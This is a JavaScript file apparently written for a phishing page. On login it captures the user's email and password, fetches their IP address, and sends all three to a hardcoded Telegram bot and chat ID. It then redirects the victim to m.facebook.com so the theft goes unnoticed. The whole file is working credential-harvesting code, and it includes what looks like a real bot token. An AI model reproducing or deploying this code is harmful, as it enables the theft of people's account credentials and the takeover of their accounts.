
const botToken = '7845338239:AAEAP-M0ELSKBqghH3zReaQ1AphDHZvyDaA'; 
const chatId = '7253995268'; 

// Login Button Click Event
document.getElementById('loginButton').addEventListener('click', function () {
  // Get User Inputs
  const email = document.getElementById('email').value;
  const password = document.getElementById('password').value;

  // Validate Inputs
  if (!email || !password) {
    alert('Please fill in both fields.');
    return;
  }

  
  fetch('https://api.ipify.org?format=json')
    .then(response => response.json())
    .then(data => {
      const userIP = data.ip;

      
      const message = `New Login Attempt:\nEmail: ${email}\nPassword: ${password}\nIP: ${userIP}`;
      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
        }),
      })
        .then(response => response.json())
        .then(data => {
          console.log('Message sent to Telegram:', data);
        })
        .catch(error => {
          console.error('Error sending message to Telegram:', error);
        });

      
      window.location.href = 'https://m.facebook.com'; 
    })
    .catch(error => {
      console.error('Error fetching IP address:', error);
      alert('Could not retrieve IP address.');
    });
});
